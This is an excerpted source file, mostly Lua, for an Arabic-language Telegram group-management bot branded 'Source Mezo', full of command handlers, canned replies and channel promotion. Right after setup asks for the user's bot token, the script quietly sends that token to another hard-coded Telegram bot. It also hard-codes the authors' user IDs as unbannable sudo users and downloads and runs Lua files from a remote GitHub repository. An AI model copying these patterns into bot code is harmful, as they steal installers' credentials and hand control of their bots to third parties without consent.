...
io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot10386181:AAF-vo/sendmessage?chat_id=9&text=' ..token)
end 
else
print('\27[0;35m𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n\27[0;33;49m')
...
io.write('\27[1;31m 𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘 ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘"
echo "TG IS NOT FIND IN FILES BOT"
echo "𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘"
exit 1
fi
if [ ! $token ]; then
echo "𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘"
...
token = sudos.token 
--- start functions 𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Ffasit/mo1ibrahim/VIKING/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,2088955578,1878261073}   
...
if tonumber(user_id) == tonumber(2088955578) then  
var = true 
elseif tonumber(user_id) == tonumber(1878261073) then
var = true  
...
local UserName = (data.username_ or "mezo571")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》")  
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'ميزو') 
local DRAGON_Msg = { 
...
local Text = ' ☻تم ارسال الملصق من 𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/Ffasit/mo1ibrahim/VIKING/main/DRAGON.lua')
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/mezo571/83/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' ☻ اصدار سورس ميزو{ 3x☆}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطور السورس☎️', url="https://t.me/Mezo508"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Mezo508&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == '𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس ميزو ادخل وتابع الجديد](t.me/mezo571)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》', url="t.me/mezo571"}}, 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/mezo571/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '━┅┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس ميزو ادخل وتابع الجديد](t.me/mezo571)
]] 
keyboard = {}  
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/mezo571)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/mezo571"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ☻ من أحسن السورسات على التليجرام سورس ميزو ☻
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "ميزو")
...
send(msg.chat_id_,0," ☻ الـعـضو  : {["..data.first_name_.."](T.ME/mezo571)}\n ☻ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ☻ عذرا  ⇇{["..data.first_name_.."](T.ME/mezo571)}\n ☻ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'مين نصبلك' then
local Text =[[
╭━━━❲☆[𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶](t.me/mezo571)☆❳━━━╮
[𝑾𝑬𝑳𝑪𝑶𝑴 𝑻𝑶 𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶](t.me/mezo571)
╰━━━❲☆[𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶](t.me/mezo571)☆❳━━━╯
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝑴𝑬𝒁𝑶', url = "https://t.me/Mezo508"},{text = '𝒁𝑰𝑨𝑫', url = "https://t.me/X_x_Z_i_a_d_x_X"}},
{{text = '𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶', url = "https://t.me/mezo571"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/aslak8/47&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == 'ميزو' or text == 'مالك السورس' or text == 'MEZO' then
local Text = [[
لو حباب تتواصل مع عمو ميزو اتبع الزر الي تحت👇
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝑴𝑬𝒁𝑶',url="t.me/Mezo508"}},
{{text = '《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》',url="t.me/mezo571"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Mezo508&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ذياد' or text == 'مطور السورس' or text == 'ZIAD' then
local Text = [[
لو حباب تتواصل مع عمو ذياد اتبع الزر الي تحت👇
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/X_x_Z_i_a_d_x_X&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == '《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》' then
local Text = [[ 
 ☻من أحسن السورسات على التليجرام سورس ميزو ☻
حمايه.سرعه.دقه وامان
 قناه السورس ⬇️
  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙰𝚈𝚃𝚁𝙰](http://t.me/mezo571)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》 ', url="t.me/mezo571"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/mezo571/84&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
☻ روايات ← لعرض الميزه
☻ ثيم ← لعرض الميزه
☻ تصميم ميزو← لعرض الميزه
☻ غنيلي بفيديو← لعرض الميزه
☻ همسه ← لعرض الميزه
☻ معني + اسمك ← لعرض الميزه
☻ خلفيات ← لعرض الميزه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
☻ 𝘾𝙃 - [《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》](t.me/mezo571) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖣘• ⁽𝑆𝐴𝑌𝑇𝑅𝐴₎ •𖣘 ❩', url="t.me/mezo571"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/mezo571/83/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'العاب ميزو' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ☻ اهلا في قائمه الالعاب المتطوره سورس ميزو ☻ 
...
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&Photo=https://t.me/aslak8/48&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--------------------------------------------------------------------------------------------------------------
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/mezo571)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
if tonumber(result.sender_user_id_) == tonumber(2088955578) then  
send(msg.chat_id_, msg.id_, " لا تستطيع حظر مالك السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1878261073) then  
...
function(arg,data) 
usertext = '\n ☻ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'mezo571')..')'
...
if result.id_ == tonumber(2088955578) then
send(msg.chat_id_, msg.id_, " لا يمكنك حظر مالك السورس عام \n")
return false 
end
if result.id_ == tonumber(1763213425) then
send(msg.chat_id_, msg.id_, " لا يمكنك حظر مطور السورس عام \n")
return false 
end
usertext = '\n ☻ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'mezo571')..')'
status  = '\n ☻ تم حظرو عام من الجروبات '
texts = usertext..status
...
if tonumber(userid) == tonumber(2088955578) then  
send(msg.chat_id_, msg.id_, " لا تستطيع حظر مالك السورس عام")
return false 
end
if tonumber(userid) == tonumber(1763213425) then  
send(msg.chat_id_, msg.id_, " لا تستطيع حظر مطور السورس عام")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(2088955578) then  
send(msg.chat_id_, msg.id_, " لا تستطيع كتم مالك السورس ")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1878261073) then  
send(msg.chat_id_, msg.id_, " لا تستطيع كتم مطور السورس")
return false 
end
...
if result.id_ == tonumber(1878261073) then
...
if tonumber(userid) == tonumber(1878261073) then  
send(msg.chat_id_, msg.id_, " لا تستطيع كتم مطور السورس")
return false 
end
...
t = ' ☻ ملفات السورس ميزو𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅??𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Ffasit/mo1ibrahim/VIKING/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ☻ اهلا بك في متجر ملفات ميزو\n ☻ ملفات السورس 𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n ☻ علامة تعني { ✔️ } ملف مفعل\n ☻ علامة تعني { ✖ } ملف معطل\n ☻ قناة سورس ميزو𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n".." ☻ [اضغط هنا لدخول](t.me/mezo571) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Ffasit/mo1ibrahim/VIKING/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ☻ عذرا الملف لايدعم سورس ميزو\n") 
end
return false
end
...
if text == ("مسح قائمه ميزو") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ☻ تم مسح قائمه ميزو')
return false
end

if text == 'قائمه ميزو' and Sudo(msg) then
...
if text == ("رفع ميزو") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ميزو@(.*)$") and Sudo(msg) then
local username = text:match("^رفع ميزو@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ميزو(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع ميزو(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل ميزو") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ميزو@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل ميزو@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ميزو(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل ميزو(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..' ☻  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ☻  الرفع  ⇇{ '..setadd..
' }\n'..' ☻  الحظر  ⇇{ '..banm..' }\n\n ☻═───═❲[《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》 ](t.me/mezo571)❳═───═ ☻\n ☻ قناة سورس ميزو𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\n [ ❲[《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》 ](t.me/mezo571)❳](t.me/mezo571) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘\nاضغط علي الاسم ليتم نسخه\n𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘ٴ\n ☻ ❲[《𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶》 ](t.me/mezo571)❳ ☻ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ميزو').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ميزو')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس ميزوو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/mezo571/55/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/mezo571/53/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/mezo571/39/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'عاش' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/mezo571/27/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'اجري' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/mezo571/30/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'لا' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/mezo571/34/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'الو' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/mezo571/41/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'حبك' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/mezo571/13/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'ميزو غني' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '❨  𖣘• ⁽☻ՏᎪYͲᎡᎪ☻₎ •𖣘 ❩', url="t.me/mo1ibrahim"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/mezo571/72/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'قمر' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/mezo571/76/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/mezo571/43/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'النشال' then
local Text = [[
]]
...
end --الكود حصري سورس ميزويعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ميزو').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه محمد ابراهيم ') 
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..☻♥️](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/mezo571)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤☻](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..☻💕](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/mezo571)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..☻💕](t.me/mezo571)')
return false
end
end
end
...
[[
🌨𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘Use ⇨ #username 🌨
🌨𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘iD ⇨ #id 🌨
🌨𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘Sta ⇨  #stast 🌨
🌨𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘Msg ⇨ #msgs 🌨
🌨𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
[[
↑𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ☻  
↑𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘𝙄𝘿 ➱ #id
↑𖣘━┅┄⟞⟦𝑺𝑶𝑼𝑹𝑪𝑬 𝑴𝑬𝒁𝑶⟧⟝┄┉━𖣘𝙍𝘼𝙉𝙆 ➱  #stast ☻  
